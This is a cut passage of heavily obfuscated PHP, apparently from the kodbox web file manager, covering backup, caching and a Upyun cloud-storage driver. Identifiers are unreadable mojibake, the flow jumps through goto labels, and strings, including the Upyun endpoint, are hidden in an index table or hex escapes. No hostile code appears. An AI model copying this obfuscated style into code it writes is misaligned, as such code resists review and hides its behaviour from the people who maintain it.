$aÔ“Ãä¿¬ª[$_SERVER[Öíæ€“”≠éÏË][725]])); goto eÿﬂ◊ö€è≤; aÆ…¶◊Ö¡: $Bàö¥Û±ªä = array($_SERVER[Öíæ€“”≠éÏË][801] => 1, $_SERVER[Öíæ€“”≠éÏË][477] => time(), $_SERVER[Öíæ€“”≠éÏË][748] => 1, $_SERVER[Öíæ€“”≠éÏË][798] => $E¿èµÊÆ î, $_SERVER[Öíæ€“”≠éÏË][790] => $Eñ∞ÆéÔÉÙ, $_SERVER[Öíæ€“”≠éÏË][789] => $AÉèéçƒ€á, $_SERVER[Öíæ€“”≠éÏË][802] => time()); if ($b•∆Ô¿ÁÇ¿) { $Bàö¥Û±ªä[$_SERVER[Öíæ€“”≠éÏË][799]] = $Eñ√ùÇ∑©è; $Bàö¥Û±ªä[$_SERVER[Öíæ€“”≠éÏË][800]] = $bçıëıË…ô; } Backup::set($Bàö¥Û±ªä); goto b‘¶òÏ–ˆ’; d¢ª–· ‘Í: $d”´ÈÂ‰∏ç->task[$_SERVER[Öíæ€“”≠éÏË][736]] = $Eñ∞ÆéÔÉÙ; $Bàö¥Û±ªä = array($_SERVER[Öíæ€“”≠éÏË][789] => $AÉèéçƒ€á, $_SERVER[Öíæ€“”≠éÏË][790] => $Eñ∞ÆéÔÉÙ, $_SERVER[Öíæ€“”≠éÏË][791] => time()); Backup::set($Bàö¥Û±ªä); goto AóÏ¢åå˜æ; AóÏ¢åå˜æ: $FÕ‹ˆ“¨Ë‰ = !0; $a÷ƒ∏ãÿ‘Ù = $this->storeIds(); $A ÿ◊ëﬂáÏ = 1; goto Fª¬ùπ¢…®; Fª¬ùπ¢…®: $BÓÇ‘∂ŒãÊ = 1000; $C˘ª·÷ÖÆ… = $b•∆Ô¿ÁÇ¿ = 0; $B©ÏÀ˜…éÉ = array(); goto d’Û—â‡≈¶; eÿﬂ◊ö€è≤: $AÉèéçƒ€á = (int) Model($_SERVER[Öíæ€“”≠éÏË][760])->where($D•ÇﬂÛ≈ÒÒ)->count($_SERVER[Öíæ€“”≠éÏË][448]); $Eñ∞ÆéÔÉÙ = (int) Model($_SERVER[Öíæ€“”≠éÏË][760])->where($D•ÇﬂÛ≈ÒÒ)->sum($_SERVER[Öíæ€“”≠éÏË][78]); $d”´ÈÂ‰∏ç = new TaskFileTransfer($_SERVER[Öíæ€“”≠éÏË][787], $_SERVER[Öíæ€“”≠éÏË][755], $AÉèéçƒ€á, LNG($_SERVER[Öíæ€“”≠éÏË][756]) . $_SERVER[Öíæ€“”≠éÏË][757] . LNG($_SERVER[Öíæ€“”≠éÏË][788])); goto d¢ª–· ‘Í; b‘¶òÏ–ˆ’: $this->_fileFilter($B©ÏÀ˜…éÉ); return !0; goto e¡ßçﬁŸäÃ; e¡ßçﬁŸäÃ: } private function _fileExist($FÜâ‚≠∏‡ˆ, &$Cç¬˘©ı’œ, $fˆ˜”Òøúœ) { goto f†ˆçœ◊ﬂ‰; f≈”ﬁÕÈ◊¶: $Cç¬˘©ı’œ = array_merge($Cç¬˘©ı’œ, array_to_keyvalue($BΩóŸ›πë , $BÌâΩöÏ˜¢[33], $BÌâΩöÏ˜¢[448])); return !1; goto AÓÿäÚ∂˘; Dâá°‡®áå: if (IO::exist($b¯—≈ ◊ã÷)) { $Cç¬˘©ı’œ[] = $FÜâ‚≠∏‡ˆ[$BÌâΩöÏ˜¢[448]]; return !1; } $DÍ›öè•Ñı = array($BÌâΩöÏ˜¢[795] => $FÜâ‚≠∏‡ˆ[$BÌâΩöÏ˜¢[795]], $BÌâΩöÏ˜¢[76] => array($BÌâΩöÏ˜¢[380], "{$b¯—≈ ◊ã÷}\x25")); $BΩóŸ›πë  = Model($BÌâΩöÏ˜¢[760])->where($DÍ›öè•Ñı)->field($BÌâΩöÏ˜¢[449])->select(); goto f≈”ﬁÕÈ◊¶; f†ˆçœ◊ﬂ‰: $BÌâΩöÏ˜¢ =& $_SERVER[Öíæ€“”≠éÏË]; $cÒöΩ¬‚úﬂ = $FÜâ‚≠∏‡ˆ[$BÌâΩöÏ˜¢[76]]; if (in_array($FÜâ‚≠∏‡ˆ[$BÌâΩöÏ˜¢[448]], $Cç¬˘©ı’œ)) { return !1; } goto bƒóÂç¬Ôî; bƒóÂç¬Ôî: if (!in_array($FÜâ‚≠∏‡ˆ[$BÌâΩöÏ˜¢[795]], $fˆ˜”Òøúœ)) { return !1; } if (IO::exist($cÒöΩ¬‚úﬂ)) { return !0; } $b¯—≈ ◊ã÷ = get_path_father($cÒöΩ¬‚úﬂ); goto Dâá°‡®áå; AÓÿäÚ∂˘: } private function _fileFilter($eÈÆõÈâÚì) { $C∏ﬂ»Ωë’ë =& $_SERVER[Öíæ€“”≠éÏË]; if (empty($eÈÆõÈâÚì)) { return; } $dÊÁÂêå¶∞ = array($C∏ﬂ»Ωë’ë[448] => array($C∏ﬂ»Ωë’ë[7], array_unique($eÈÆõÈâÚì))); $Eü≠ÖçøäÜ = Model($C∏ﬂ»Ωë’ë[803])->where($dÊÁÂêå¶∞)->field($C∏ﬂ»Ωë’ë[396])->select(); foreach ($Eü≠ÖçøäÜ as $F„ÒÇÈ›ƒ£) { Model($C∏ﬂ»Ωë’ë[803])->remove($F„ÒÇÈ›ƒ£[$C∏ﬂ»Ωë’ë[396]], !1); } } private function storeIds() { $D¢î∆ﬁê’Á =& $_SERVER[Öíæ€“”≠éÏË]; $c„ïòØ›“ü = Model($D¢î∆ﬁê’Á[740])->listData(); $aÌü≠ıË˘ = array(); $Dÿ«åÕπØŒ = $GLOBALS[$D¢î∆ﬁê’Á[6]][$D¢î∆ﬁê’Á[88]][$D¢î∆ﬁê’Á[804]]; foreach ($c„ïòØ›“ü as $Bç˜®Ô…◊≠) { $F¶á«¥‡à≈ = strtolower($Bç˜®Ô…◊≠[$D¢î∆ﬁê’Á[94]]); if (!isset($Dÿ«åÕπØŒ[$F¶á«¥‡à≈])) { continue; } $a€®®ÓÓÑ∫ = $D¢î∆ﬁê’Á[72] . (isset($Dÿ«åÕπØŒ[$F¶á«¥‡à≈]) ? $Dÿ«åÕπØŒ[$F¶á«¥‡à≈] : ucfirst($F¶á«¥‡à≈)); if (!class_exists($a€®®ÓÓÑ∫)) { continue; } $aÌü≠ıË˘[] = $Bç˜®Ô…◊≠[$D¢î∆ﬁê’Á[394]]; } return $aÌü≠ıË˘; } } class Cache { protected static $handle; protected static $memoryCache; public static function init() { goto bÎøòâîä°; bÎøòâîä°: $Bêì≈ÿÃƒπ =& $_SERVER[Öíæ€“”≠éÏË]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); goto AÇöÃä…ß–; AÇöÃä…ß–: $cÿÖß§◊≥∆ = $GLOBALS[$Bêì≈ÿÃƒπ[6]][$Bêì≈ÿÃƒπ[347]]; $B∆‹—ïÿÌÃ = $cÿÖß§◊≥∆[$cÿÖß§◊≥∆[$Bêì≈ÿÃƒπ[805]]]; $f¿‡∫Ôà‡” = $cÿÖß§◊≥∆[$Bêì≈ÿÃƒπ[806]]; goto AÇ•íÿ¢Êà; AÇ•íÿ¢Êà: switch ($cÿÖß§◊≥∆[$Bêì≈ÿÃƒπ[805]]) { case $Bêì≈ÿÃƒπ[17]: self::$handle = Model($Bêì≈ÿÃƒπ[807]); break; case $Bêì≈ÿÃƒπ[808]: self::$handle = new CacheRedis($B∆‹—ïÿÌÃ, $f¿‡∫Ôà‡”); break; case $Bêì≈ÿÃƒπ[809]: self::$handle = new CacheMemcached($B∆‹—ïÿÌÃ, $f¿‡∫Ôà‡”); break; case $Bêì≈ÿÃƒπ[193]: self::$handle = new CacheFile($B∆‹—ïÿÌÃ, $f¿‡∫Ôà‡”); break; default: break; } return self::$handle; goto féõó£Ú√í; féõó£Ú√í: } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($dº±◊ÕÕıﬁ) { if (is_array($dº±◊ÕÕıﬁ) || is_object($dº±◊ÕÕıﬁ)) { $dº±◊ÕÕıﬁ = json_encode($dº±◊ÕÕıﬁ); } $dº±◊ÕÕıﬁ = rawurlencode($dº±◊ÕÕıﬁ); return md5(KOD_SITE_ID . $_SERVER[Öíæ€“”≠éÏË][71] . $dº±◊ÕÕıﬁ); } public static function get($FŸöäéÈçî, $Fã÷¨◊“Üê = false) { $d◊ ÈËâˆö = self::key($FŸöäéÈçî); if ($Fã÷¨◊“Üê) { return unserialize(self::init()->get($d◊ ÈËâˆö)); } if (!isset(self::$memoryCache[$d◊ ÈËâˆö])) { $E™íò«©°‡ = self::init()->get($d◊ ÈËâˆö); self::$memoryCache[$d◊ ÈËâˆö] = unserialize($E™íò«©°‡); } return self::$memoryCache[$d◊ ÈËâˆö]; } public static function set($C·£Óåáıæ, $BèÊ˜√ãîı, $Dí§‰„±ä§ = false) { goto BÒãò≠∑õ£; BÒãò≠∑õ£: $F˜¨’∞¡ÈÀ = self::key($C·£Óåáıæ); if (isset(self::$memoryCache[$F˜¨’∞¡ÈÀ]) && self::$memoryCache[$F˜¨’∞¡ÈÀ] === $BèÊ˜√ãîı) { return !0; } if ($Dí§‰„±ä§ === 0) { self::$memoryCache[$F˜¨’∞¡ÈÀ] = $BèÊ˜√ãîı; return !0; } goto FïçÂ‚•åÆ; EƒÇÿøè€Ÿ: CacheLock::unlock($C·£Óåáıæ); return $FóËØ˘‡ùü; goto D“∞ó≥âÕÌ; FïçÂ‚•åÆ: CacheLock::lock($C·£Óåáıæ); $FóËØ˘‡ùü = self::init()->set($F˜¨’∞¡ÈÀ, serialize($BèÊ˜√ãîı), $Dí§‰„±ä§); self::$memoryCache[$F˜¨’∞¡ÈÀ] = $BèÊ˜√ãîı; goto EƒÇÿøè€Ÿ; D“∞ó≥âÕÌ: } public static function getCall($Cµ‚ù«´—é, $a∞Í–ôŸ‘œ, $AóêëŸè …, $fîì∂íæèÇ = array()) { goto D≈ç™ã›Ö∞; D≈ç™ã›Ö∞: $Aå«ÖûÖáÑ =& $_SERVER[Öíæ€“”≠éÏË]; $Fâø˘‹Ïãã = self::get($Cµ‚ù«´—é); if ($Fâø˘‹Ïãã || $Fâø˘‹Ïãã === $Aå«ÖûÖáÑ[33]) { return $Fâø˘‹Ïãã; } goto Dòñïó¨åÏ; Dòñïó¨åÏ: $Fâø˘‹Ïãã = call_user_func_array($AóêëŸè …, $fîì∂íæèÇ); $Fâø˘‹Ïãã = $Fâø˘‹Ïãã ? $Fâø˘‹Ïãã : $Aå«ÖûÖáÑ[33]; self::set($Cµ‚ù«´—é, $Fâø˘‹Ïãã, $a∞Í–ôŸ‘œ); goto e¢ÉÑÔàèı; e¢ÉÑÔàèı: return $Fâø˘‹Ïãã; goto aÌ◊“âßÌŒ; aÌ◊“âßÌŒ: } public static function remove($Däÿ⁄◊®‘Á) { goto Dç™ßæÒ–Î; Fêáè‚¥Ç™: CacheLock::lock($Däÿ⁄◊®‘Á); $E¯ª⁄¶“≥ˆ = self::init()->remove($fè˘é«”®Ç); CacheLock::unlock($Däÿ⁄◊®‘Á); goto e¡ê≥ãÂÎΩ; Dç™ßæÒ–Î: $fè˘é«”®Ç = self::key($Däÿ⁄◊®‘Á); unset(self::$memoryCache[$fè˘é«”®Ç]); self::clearTimeout(); goto Fêáè‚¥Ç™; e¡ê≥ãÂÎΩ: return $E¯ª⁄¶“≥ˆ; goto A¢ñí÷éòó; A¢ñí÷éòó: } public static function removeMemory($bÌÍ’ı‘µÏ) { $Dÿëó”‡≤∆ = self::key($bÌÍ’ı‘µÏ); unset(self::$memoryCache[$Dÿëó”‡≤∆]); } public static function clearMemory($F™ÍºÇÕ¡• = false) { if ($F™ÍºÇÕ¡•) { $F™ÍºÇÕ¡• = self::key($F™ÍºÇÕ¡•); unset(self::$memoryCache[$F™ÍºÇÕ¡•]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[Öíæ€“”≠éÏË][810])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[Öíæ€“”≠éÏË][811])) { self::init()->clearTimeout(); } } } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($C∏±§®± Ω, $cöœ◊◊åÂÔ) { $F—‚ÀÌŒ⁄º =& $_SERVER[Öíæ€“”≠éÏË]; $this->cachePath = $C∏±§®± Ω[$F—‚ÀÌŒ⁄º[76]]; $this->prefix = $F—‚ÀÌŒ⁄º[812]; $this->cacheTime = $cöœ◊◊åÂÔ; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, 511, !0); } } public function getFile($B√È†¢õã∏) { $fØ≠»Ø¯§’ =& $_SERVER[Öíæ€“”≠éÏË]; $B√È†¢õã∏ = str_replace(array($fØ≠»Ø¯§’[813], $fØ≠»Ø¯§’[97], $fØ≠»Ø¯§’[70]), $fØ≠»Ø¯§’[814], $B√È†¢õã∏); return $this->cachePath . $fØ≠»Ø¯§’[815] . $B√È†¢õã∏ . $fØ≠»Ø¯§’[816]; } public function set($E¶ú…ûêÁÑ, $Eã‰≈ıõºÊ, $dÕïâøÑ”º = false) { $f·˜·›ã√  = $this->getFile($E¶ú…ûêÁÑ); if (file_put_contents($f·˜·›ã√ , $this->prefix . $Eã‰≈ıõºÊ, LOCK_EX)) { @touch($f·˜·›ã√ , intval(time() + $dÕïâøÑ”º)); clearstatcache(); return !0; } @unlink($f·˜·›ã√ ); return !1; } public function get($B∆ÒÉâÜï·) { $B◊”Âıë‘¿ = $this->getFile($B∆ÒÉâÜï·); if (file_exists($B◊”Âıë‘¿) && filemtime($B◊”Âıë‘¿) < time()) { @unlink($B◊”Âıë‘¿); return !1; } $e⁄ó∞Üœ∂“ = @file_get_contents($B◊”Âıë‘¿); return substr($e⁄ó∞Üœ∂“, strlen($this->prefix)); } public function remove($AöÀ¬êä‡¶) { $cãí‘œ–¥ÿ = $this->getFile($AöÀ¬êä‡¶); return @unlink($cãí‘œ–¥ÿ); } public function deleteAll() { $cœ»≤àúµ£ =& $_SERVER[Öíæ€“”≠éÏË]; $fú–ÿÖçéÔ = scandir($this->cachePath); foreach ($fú–ÿÖçéÔ as $A–ıÉâ¢›‹) { $fÓ·≤∫î≈£ = $this->cachePath . $A–ıÉâ¢›‹; if (strpos($fÓ·≤∫î≈£, $cœ»≤àúµ£[816]) && strpos($fÓ·≤∫î≈£, $cœ»≤àúµ£[817])) { @unlink($fÓ·≤∫î≈£); } } } public function clearTimeout() { $b¥ú•Ëá™Ç =& $_SERVER[Öíæ€“”≠éÏË]; $aí±◊›≤ÇÈ = scandir($this->cachePath); foreach ($aí±◊›≤ÇÈ as $EÎåÇç¡ü») { $C∞„â«¯î = $this->cachePath . $EÎåÇç¡ü»; if (strpos($C∞„â«¯î, $b¥ú•Ëá™Ç[816]) && strpos($C∞„â«¯î, $b¥ú•Ëá™Ç[817]) && filemtime($C∞„â«¯î) < time()) { @unlink($C∞„â«¯î); } } } } goto C“«¨øÇÎ≈; B´Ô≥∂Ó„ø: class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($C™¨ï∏Á©ø, $BáΩøÔå–Æ = 0) { parent::__construct(); $this->source = $C™¨ï∏Á©ø; $this->sourceSize = $BáΩøÔå–Æ; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($e„ÿóûÚΩÈ = false) { return $this->sourceSize; } public function getContent($F£ı⁄Ñõ≠À = false) { return $this->fileSubstr($F£ı⁄Ñõ≠À, 0, $this->sourceSize); } public function fileSubstr($BÇë™‚œãö = false, $b“∆¨Ì◊ëì = 0, $FêíÏ›·’• = 0) { if (!$FêíÏ›·’•) { $FêíÏ›·’• = $this->sourceSize; } $b”˘ÈπﬂÌÙ = $this->sourceSize - $b“∆¨Ì◊ëì; if ($FêíÏ›·’• >= $b”˘ÈπﬂÌÙ) { $FêíÏ›·’• = $b”˘ÈπﬂÌÙ; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $b“∆¨Ì◊ëì, $FêíÏ›·’•); } if ($this->sourceType == self::TYPE_FILE) { if ($FêíÏ›·’• <= 0) { return $_SERVER[Öíæ€“”≠éÏË][33]; } $bü·†Ó”öﬂ = ftell($this->source); fseek_64($this->source, $bü·†Ó”öﬂ + $b“∆¨Ì◊ëì); $e¡•™öØ≈ã = @fread($this->source, $FêíÏ›·’•); fseek_64($this->source, $bü·†Ó”öﬂ); return $e¡•™öØ≈ã; } } public function hashMd5($bÁ∫∆ù£ß‘ = false) { return md5($this->getContent()); } public static function hash($fââô„∞ÂÀ, $AëáÌø±´≤ = 0) { $Eà‹Èµ‘„ä = new PathDriverStream($fââô„∞ÂÀ, $AëáÌø±´≤); return $Eà‹Èµ‘„ä->hashSimple($fââô„∞ÂÀ); } public static function md5($E ÀÌöÖ´≈, $AÒ⁄È—∑≈î = 0) { $AÏ…†µöª› = new PathDriverStream($E ÀÌöÖ´≈, $AÒ⁄È—∑≈î); return $AÏ…†µöª›->hashMd5($E ÀÌöÖ´≈); } } class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\150\164\164\160\x3a\57\57\166\60\x2e\x61\x70\x69\x2e\165\x70\x79\x75\156\x2e\143\157\x6d"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($EﬂÓüãÛîŒ) { parent::__construct(); $this->_init($EﬂÓüãÛîŒ); } public function _init($EØëªÀÀÜÍ) { $FÜ”ƒÉñÀé =& $_SERVER[Öíæ€“”≠éÏË]; foreach ($EØëªÀÀÜÍ as $Bû∑∞√éÇè => $eø≤¿îÁä“) { if (isset($this->{$Bû∑∞√éÇè})) { $this->{$Bû∑∞√éÇè} = $eø≤¿îÁä“; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($FÜ”ƒÉñÀé[1340] . LNG($FÜ”ƒÉñÀé[1273])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($Dì…í≤ìıÿ, $b…πÂ•≤æ“ = "\107\105\x54") { $dﬂ°≠ã∞•∫ =& $_SERVER[Öíæ€“”≠éÏË]; $F¯ëê›øü• = gmdate($dﬂ°≠ã∞•∫[1306]); $AÃë†ÉèëÏ = base64_encode(hash_hmac($dﬂ°≠ã∞•∫[1341], "{$b…πÂ•≤æ“}\46{$Dì…í≤ìıÿ}\46{$F¯ëê›øü•}", md5("{$this->userpass}"), !0)); $Cà¢ú√œı· = array("\101\x75\164\x68\x6f\x72\151\x7a\141\x74\x69\157\x6e\x3a\125\x50\131\125\116\40{$this->username}\x3a{$AÃë†ÉèëÏ}", "\104\141\164\145\x3a{$F¯ëê›øü•}"); return $Cà¢ú√œı·; } public function ussRequest($D»≠ÃªèÎŸ, $C¿Ñ˜Ñœ¥ø = "\107\x45\124", $cËºÜ∑ÆˆÉ = false, $AµøêÓ„Ûõ = false, $B’•ÛÉÌÔ≠ = false) { goto f…ì–µáˆÖ; f…ì–µáˆÖ: $Cá»≠ŸÛÈë =& $_SERVER[Öíæ€“”≠éÏË]; $D»≠ÃªèÎŸ = trim($D»≠ÃªèÎŸ, $Cá»≠ŸÛÈë[8]); $AÿÒó∫¡÷° = "\x2f{$this->bucket}\57{$D»≠ÃªèÎŸ}"; goto D”ÁßâôÈì; D”ÁßâôÈì: $aÖﬁ¥Œ÷ú¯ = $this->ussHeaders($AÿÒó∫¡÷°, $C¿Ñ˜Ñœ¥ø); if ($AµøêÓ„Ûõ) { $aÖﬁ¥Œ÷ú¯ = array_merge($aÖﬁ¥Œ÷ú¯, $AµøêÓ„Ûõ); } $CáÓ¥àÎ‚≤ = url_request($this->endpoint . $AÿÒó∫¡÷°, $C¿Ñ˜Ñœ¥ø, $cËºÜ∑ÆˆÉ, $aÖﬁ¥Œ÷ú¯, $B’•ÛÉÌÔ≠); goto cå‚Œ¢“ŸÆ; cå‚Œ¢“ŸÆ: if (!$CáÓ¥àÎ‚≤) { return array($Cá»≠ŸÛÈë[1095] => !1, $Cá»≠ŸÛÈë[1097] => $Cá»≠ŸÛÈë[1342]); } if (strtolower($C¿Ñ˜Ñœ¥ø) == $Cá»≠ŸÛÈë[190] || in_array($CáÓ¥àÎ‚≤[$Cá»≠ŸÛÈë[1095]], array($Cá»≠ŸÛÈë[1198], $Cá»≠ŸÛÈë[1343]))) { $cËºÜ∑ÆˆÉ = $CáÓ¥àÎ‚≤[$Cá»≠ŸÛÈë[1344]]; } else { $cËºÜ∑ÆˆÉ = json_decode($CáÓ¥àÎ‚≤[$Cá»≠ŸÛÈë[1097]], !0); if (!$cËºÜ∑ÆˆÉ) { $cËºÜ∑ÆˆÉ = $CáÓ¥àÎ‚≤[$Cá»≠ŸÛÈë[1097]]; } else { if (!$CáÓ¥àÎ‚≤[$Cá»≠ŸÛÈë[723]] && isset($cËºÜ∑ÆˆÉ[$Cá»≠ŸÛÈë[1345]])) { $cËºÜ∑ÆˆÉ = $cËºÜ∑ÆˆÉ[$Cá»≠ŸÛÈë[1345]]; } } } return array($Cá»≠ŸÛÈë[1095] => $CáÓ¥àÎ‚≤[$Cá»≠ŸÛÈë[723]], $Cá»≠ŸÛÈë[1097] => $cËºÜ∑ÆˆÉ); goto bﬂ›çó®ßô; bﬂ›çó®ßô: } public function mkfile($EΩº§∞ºü≠, $CÈµñÔÑ€€ = '', $A¢ıßá•Ú = REPEAT_RENAME) { if ($this->setContent($EΩº§∞ºü≠, $CÈµñÔÑ€€)) { return $this->getPathOuter($EΩº§∞ºü≠); } return !1; } public function mkdir($Aââ≥åâÀ´, $d§üò¨Ÿ∏ê = REPEAT_SKIP) { $EåÓÌ– ëÜ =& $_SERVER[Öíæ€“”≠éÏË]; $dõÜﬁ§‚√ç = trim($Aââ≥åâÀ´, $EåÓÌ– ëÜ[8]); if ($this->_isFolder($dõÜﬁ§‚√ç)) { return $this->getPathOuter($dõÜﬁ§‚√ç); } $A—≤€…ÒÃ– = array($EåÓÌ– ëÜ[1346]); $e∏√Í€è™‚ = $this->ussRequest($dõÜﬁ§‚√ç, $EåÓÌ– ëÜ[224], !1, $A—≤€…ÒÃ–); return $e∏√Í€è™‚[$EåÓÌ– ëÜ[1095]] ? $this->getPathOuter($dõÜﬁ§‚√ç) : !1; } public function copyFile($D⁄ÕŸ¢çÿ, $A°¿åÈÓëï) { $C÷Ï†√Ë∂… =& $_SERVER[Öíæ€“”≠éÏË]; $C„≠Ÿ¨åã÷ = array($C÷Ï†√Ë∂…[1347] . "\57{$this->bucket}\57{$D⁄ÕŸ¢çÿ}", $C÷Ï†√Ë∂…[1348]); $aÔáÜÎÚø‚ = $this->ussRequest($A°¿åÈÓëï, $C÷Ï†√Ë∂…[226], !1, $C„≠Ÿ¨åã÷); return $aÔáÜÎÚø‚[$C÷Ï†√Ë∂…[1095]] ? !0 : $this->getPathOuter($A°¿åÈÓëï); } public function moveFile($A©ò˘⁄•ı´, $cè¢êâ¡”œ) { $E ∫Ï±…´∞ =& $_SERVER[Öíæ€“”≠éÏË]; $CÃçùÓÜèπ = array($E ∫Ï±…´∞[1349] . "\57{$this->bucket}\57{$A©ò˘⁄•ı´}", $E ∫Ï±…´∞[1348]); $eÂŸ‡Çâÿû = $this->ussRequest($cè¢êâ¡”œ, $E ∫Ï±…´∞[226], !1, $CÃçùÓÜèπ); return $eÂŸ‡Çâÿû[$E ∫Ï±…´∞[1095]] ? !0 : $this->getPathOuter($cè¢êâ¡”œ); } public function delFile($AÖÆàçÎÊπ) { $Aì’ƒ˘ ÌŒ =& $_SERVER[Öíæ€“”≠éÏË]; $CÑÑ‹πŒ∑ø = $this->ussRequest($AÖÆàçÎÊπ, $Aì’ƒ˘ ÌŒ[1350]); return $CÑÑ‹πŒ∑ø[$Aì’ƒ˘ ÌŒ[1095]] ? !0 : !1; } public function delFolder($dÚï“ƒØôÏ) { goto FÆ∑€Ûı¢û; cﬁÛèÑ¥âŒ: $EÊ£èÊÜàÖ = $D¨à›ı™√á = array(); $this->fileList($dÚï“ƒØôÏ, $EÊ£èÊÜàÖ, $D¨à›ı™√á, !0); $this->listItemCache = !0; goto Cπáøÿ±áÚ; dÑ†ñôÁπâ: return $B–⁄Ôèí⁄å[$E¬ı⁄¨≈ƒ÷[1095]]; goto Eéπ©ÑÿÏ°; Cπáøÿ±áÚ: foreach ($D¨à›ı™√á as $dÎÙÍ©áœÃ) { $B–⁄Ôèí⁄å = $this->ussRequest($dÎÙÍ©áœÃ[$E¬ı⁄¨≈ƒ÷[28]], $E¬ı⁄¨≈ƒ÷[1350]); if (!$B–⁄Ôèí⁄å[$E¬ı⁄¨≈ƒ÷[1095]]) { return !1; } } foreach ($EÊ£èÊÜàÖ as $e¡—„›é„˜) { $B–⁄Ôèí⁄å = $this->ussRequest($e¡—„›é„˜, $E¬ı⁄¨≈ƒ÷[1350]); if (!$B–⁄Ôèí⁄å[$E¬ı⁄¨≈ƒ÷[1095]]) { return !1; } } $B–⁄Ôèí⁄å = $this->ussRequest($dÚï“ƒØôÏ, $E¬ı⁄¨≈ƒ÷[1350]); goto dÑ†ñôÁπâ; FÆ∑€Ûı¢û: $E¬ı⁄¨≈ƒ÷ =& $_SERVER[Öíæ€“”≠éÏË]; if (!$this->exist($dÚï“ƒØôÏ)) { return !0; } $this->listItemCache = !1; goto cﬁÛèÑ¥âŒ; Eéπ©ÑÿÏ°: } public function rename($Bµ¢ÛØœŸ€, $A˜»◊ÛÇ∆Ì) { if ($this->isFile($Bµ¢ÛØœŸ€)) { $A˜»◊ÛÇ∆Ì = get_path_father($Bµ¢ÛØœŸ€) . $A˜»◊ÛÇ∆Ì; return $this->moveFile($Bµ¢ÛØœŸ€, $A˜»◊ÛÇ∆Ì); } return $this->renameObject($Bµ¢ÛØœŸ€, $A˜»◊ÛÇ∆Ì); } public function fileInfo($FÃà–Éì∆’, $cû∫†Ö†øå = false, $C◊”Ÿ≥˜∑˘ = array()) { goto AöãÙ Êº≤; AöãÙ Êº≤: $b˘∫±–≤«∏ =& $_SERVER[Öíæ€“”≠éÏË]; $A≈é≈πßÁÍ = array($b˘∫±–≤«∏[28] => $this->pathThis($FÃà–Éì∆’), $b˘∫±–≤«∏[76] => $this->getPathOuter($b˘∫±–≤«∏[8] . $FÃà–Éì∆’), $b˘∫±–≤«∏[29] => $b˘∫±–≤«∏[193], $b˘∫±–≤«∏[78] => isset($C◊”Ÿ≥˜∑˘[$b˘∫±–≤«∏[78]]) ? $C◊”Ÿ≥˜∑˘[$b˘∫±–≤«∏[78]] : 0, $b˘∫±–≤«∏[168] => $this->ext($FÃà–Éì∆’)); if ($cû∫†Ö†øå) { return $A≈é≈πßÁÍ; } goto bù±⁄º°∞é; BÛèãÿ¨≥: return $A≈é≈πßÁÍ; goto CŒ◊πª“Ìœ; bù±⁄º°∞é: $A≈é≈πßÁÍ[$b˘∫±–≤«∏[194]] = $A≈é≈πßÁÍ[$b˘∫±–≤«∏[84]] = 0; $A≈é≈πßÁÍ[$b˘∫±–≤«∏[195]] = $A≈é≈πßÁÍ[$b˘∫±–≤«∏[196]] = !0; if (empty($C◊”Ÿ≥˜∑˘)) { $C◊”Ÿ≥˜∑˘ = $this->objectMeta($FÃà–Éì∆’); if (!$C◊”Ÿ≥˜∑˘) { return $A≈é≈πßÁÍ; } } goto bﬂ≤Ï≠ﬁáì; bﬂ≤Ï≠ﬁáì: $A≈é≈πßÁÍ[$b˘∫±–≤«∏[194]] = intval($C◊”Ÿ≥˜∑˘[$b˘∫±–≤«∏[1351]]); $A≈é≈πßÁÍ[$b˘∫±–≤«∏[84]] = intval($C◊”Ÿ≥˜∑˘[$b˘∫±–≤«∏[1352]]); $A≈é≈πßÁÍ[$b˘∫±–≤«∏[78]] = $C◊”Ÿ≥˜∑˘[$b˘∫±–≤«∏[78]]; goto BÛèãÿ¨≥; CŒ◊πª“Ìœ: } public function folderInfo($F–Ω°“Ü¢ç, $A¡Ãπ†§“Û = false) { goto dëè„úÿÃä; dëè„úÿÃä: $E¢ø®®Ùãø =& $_SERVER[Öíæ€“”≠éÏË]; $F›ªŒÃ≤¢† = array($E¢ø®®Ùãø[28] => $this->pathThis($F–Ω°“Ü¢ç), $E¢ø®®Ùãø[76] => $this->getPathOuter($E¢ø®®Ùãø[8] . $F–Ω°“Ü¢ç), $E¢ø®®Ùãø[29] => $E¢ø®®Ùãø[77]); if ($A¡Ãπ†§“Û) { return $F›ªŒÃ≤¢†; } goto càÂ◊ïéâù; C†∑ÌôÔ·µ: $F›ªŒÃ≤¢†[$E¢ø®®Ùãø[194]] = intval($cÊÙãÇ«“â[$E¢ø®®Ùãø[1351]]); $F›ªŒÃ≤¢†[$E¢ø®®Ùãø[84]] = intval($cÊÙãÇ«“â[$E¢ø®®Ùãø[1352]]); return $F›ªŒÃ≤¢†; goto aïÒøØÔóÇ; càÂ◊ïéâù: $F›ªŒÃ≤¢†[$E¢ø®®Ùãø[194]] = $F›ªŒÃ≤¢†[$E¢ø®®Ùãø[84]] = 0; $F›ªŒÃ≤¢†[$E¢ø®®Ùãø[195]] = $F›ªŒÃ≤¢†[$E¢ø®®Ùãø[196]] = !0; if (empty($cÊÙãÇ«“â)) { $cÊÙãÇ«“â = $this->objectMeta($F–Ω°“Ü¢ç); if (!$cÊÙãÇ«“â) { return $F›ªŒÃ≤¢†; } } goto C†∑ÌôÔ·µ; aïÒøØÔóÇ: } private function listObjs($Cò·•–ÉŸ´, $Bé”óà⁄´† = 0, $bÉ–∏›”≠Î = 1000) { $a¨¿ßÖ‘ÆÏ =& $_SERVER[Öíæ€“”≠éÏË]; 